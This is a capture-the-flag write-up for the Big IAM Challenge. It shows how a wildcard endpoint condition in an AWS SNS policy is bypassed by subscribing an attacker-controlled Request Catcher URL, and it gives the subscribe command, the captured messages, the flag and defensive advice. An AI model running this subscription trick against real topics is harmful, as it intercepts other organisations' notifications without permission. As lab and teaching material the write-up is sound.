# Writeup for Big IAM Challenge: Challenge 3

# Challenge number

    3

## Challenge Statement

The objective of this challenge was to exploit overly permissive SNS (Simple Notification Service) policies, subscribe to a topic, and capture the flag by analyzing messages received via the topic.

## IAM Policy

```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

### Short analysis about the IAM policy

```
* What do I have access to?
  - The policy allows anyone (Principal: "*") to subscribe to the TBICWizPushNotifications SNS topic as long as the subscription endpoint matches *@tbic.wiz.io.

* What don't I have access to?
  - The policy does not grant access to publish messages or manage the topic itself, limiting interaction to subscribing and receiving notifications.

* What do I find interesting?
  - The condition in the policy (sns:Endpoint: "*@tbic.wiz.io") limits subscriptions to specific email addresses, but it’s still overly permissive, allowing external users with matching domains to exploit this.
```

## Solution

Step 1: Set Up a Custom Endpoint
To bypass the sns:Endpoint condition, I utilized Request Catcher (https://requestcatcher.com/). I created a custom catcher endpoint:

    https://srush.requestcatcher.com/

This endpoint could receive and log HTTP requests, allowing me to intercept messages sent by SNS.

Step 2: Subscribed to the SNS Topic
Using the custom endpoint, I executed the following command to subscribe to the TBICWizPushNotifications SNS topic:

    aws sns subscribe \
        --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
        --protocol https \
        --notification-endpoint 'https://srush.requestcatcher.com/test@tbic.wiz.io'

    The command returned a Subscription ARN, confirming that the subscription request was successful.

Step 3: Confirmed the Subscription
Step 3: Confirmed the Subscription
After running the aws sns subscribe command, the response indicated the subscription was in a "pending confirmation" state:

{
"SubscriptionArn": "pending confirmation"
}
To confirm the subscription, I checked the logs of my Request Catcher endpoint (https://srush.requestcatcher.com/test@tbic.wiz.io). The logs showed an HTTP POST request containing the SubscriptionConfirmation message, as shown below:

```
POST /test@tbic.wiz.io HTTP/1.1
Host: srush.requestcatcher.com
Accept-Encoding: gzip,deflate
Connection: Keep-Alive
Content-Length: 1623
Content-Type: text/plain; charset=UTF-8
User-Agent: Amazon Simple Notification Service Agent
X-Amz-Sns-Message-Id: 2cbb4f40-6af8-4e2c-ad1c-c337328bb9fd
X-Amz-Sns-Message-Type: SubscriptionConfirmation
X-Amz-Sns-Topic-Arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications

{
  "Type" : "SubscriptionConfirmation",
  "MessageId" : "2cbb4f40-6af8-4e2c-ad1c-c337328bb9fd",
  "Token" : "2336412f37fb687f5d51e6e2425a8a58714989472d236a6cba8478a654dc0e7f80161c55d6a73bf77ee9560b99fe7f6749fc26b2b0186453c7abd48bd7e0ecda3dd2e3267e6349e30e3d50b8f2286b082d53fa789a2663a66d46b95d85fd56176923ac0799789cd4cc02ff58f36808e90b1b9367c30ba0b398b461a37963e9ed",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.",
  "SubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a58714989472d236a6cba8478a654dc0e7f80161c55d6a73bf77ee9560b99fe7f6749fc26b2b0186453c7abd48bd7e0ecda3dd2e3267e6349e30e3d50b8f2286b082d53fa789a2663a66d46b95d85fd56176923ac0799789cd4cc02ff58f36808e90b1b9367c30ba0b398b461a37963e9ed",
  "Timestamp" : "2025-01-25T16:09:23.224Z",
  "SignatureVersion" : "1",
  "Signature" : "k90wEAyUHIGHx0SOtDqiz4Wnft/Je+Nr5c3x6RHpKI2maYiiX0fKvCrMGyjC6zyiaDvbJgmLg2iMzfnvSogoie0lN6SfzN8j+RiFIhXa4B9KljZyTVmNXsslvEWvt8cdH6WAnTtwoxvE1eSTOROUay7FsMTIxYnON4ljriFLCQEHY2bq9EIccexMyG9jLxxKOUXC87snLs3JsU1rgQHCii+czANp8WPjzUGh7VzcqEZV2Y7okqiuVqw5kViZ2+7GchXwdnuU9faliv+1eLsgGJUzcKKsox/dJ/FOXYTvkZRzu+ZR483DoNwnuLzD+AqbiEcHfiHXi2FNqpp6K56P2g==",
  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem"
}
```

Step 4: Captured the Flag
After confirmation, I waited for notifications to be sent to the topic. Shortly after, a new request was logged in Request Catcher with the message content:

```
POST /test@tbic.wiz.io HTTP/1.1
Host: srush.requestcatcher.com
Accept-Encoding: gzip,deflate
Connection: Keep-Alive
Content-Length: 963
Content-Type: text/plain; charset=UTF-8
User-Agent: Amazon Simple Notification Service Agent
X-Amz-Sns-Message-Id: cf626a84-6014-5f7b-ae44-0a8b6c00f0f6
X-Amz-Sns-Message-Type: Notification
X-Amz-Sns-Subscription-Arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:26ec4347-b10d-4942-b797-f59fbc3a7452
X-Amz-Sns-Topic-Arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications
X-Amzn-Trace-Id: Root=1-679509d4-75913e4734dcd90038c3c617;Parent=53a4b57d53b59978;Sampled=0;Lineage=1:36680206:0

{
  "Type" : "Notification",
  "MessageId" : "cf626a84-6014-5f7b-ae44-0a8b6c00f0f6",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "{wiz:always-suspect-asterisks}",
  "Timestamp" : "2025-01-25T15:57:08.497Z",
  "SignatureVersion" : "1",
  "Signature" : "dOnhS0W5G8/DDS4GCxRTQ3IIYTlXgEHllJiL/ePM4wo1CcE2nju2YHJfbuQQ/nG+q7pk+Oi+2p32vF1FOGrE+bACdr/uEEcV4L/oglI1Uv5rx2fUUtO+9JQcf+XhceKrPlvuQywFjSBhgR2VpRwHXS9MrIiyGk4E0gQha5BJVbDPme6Li0qlVyKEx6rCA7wXt7qtWBT/1Csb4zkS+NG8KzMyjyeqSk3UY+h6kAcZXP8OqdFuI+2EEMrhBnxqSw3Ro86jIN76nngAFlgMu8l20tA4qkQ82eYPBs551om2ut7R8Z+s0F1hQANKN7zkovBS6C+a8VmEamkx8sK/nQlmKA==",
  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem",
  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:26ec4347-b10d-4942-b797-f59fbc3a7452"
}
```

I extracted the flag from the Message field:

FLAG: {wiz:always-suspect-asterisks}

Step 5: Submitted the Flag

Finally, I inserted the flag found in the "Insert flag here" textbox and I was redirected to success screen.

## Reflection

- What was your approach?
  I bypassed the sns:Endpoint condition by using Request Catcher to simulate a valid endpoint and successfully intercepted SNS notifications.

- What was the biggest challenge?
  The challenge was ensuring that the custom endpoint met the policy's condition while being able to capture and log requests.

- How did you overcome the challenges?
  Using Request Catcher allowed me to create a compliant endpoint (https://srush.requestcatcher.com/) and efficiently capture the confirmation and notification messages.

- What led to the breakthrough?
  Understanding that sns:Endpoint conditions validate the domain pattern but do not verify endpoint ownership enabled me to bypass this restriction. Request Catcher proved to be an invaluable tool to simulate an endpoint and capture SNS traffic.

- On the Blue Side: Defensive Measures
  - Restrict the Principal: Replace Principal: "\_" with trusted roles or accounts to limit unauthorized access.
  - Use endpoint verification: Ensure that endpoints are owned or managed by the intended recipients using tokenized confirmation processes.
  - Disable overly broad conditions: Replace wildcard conditions like sns:Endpoint: "_@tbic.wiz.io" with specific allowed endpoints.
  - Monitor subscriptions and logs: Regularly audit SNS subscriptions and logs for suspicious activities.
  - Enable encryption: Use message encryption to protect sensitive data in transit.
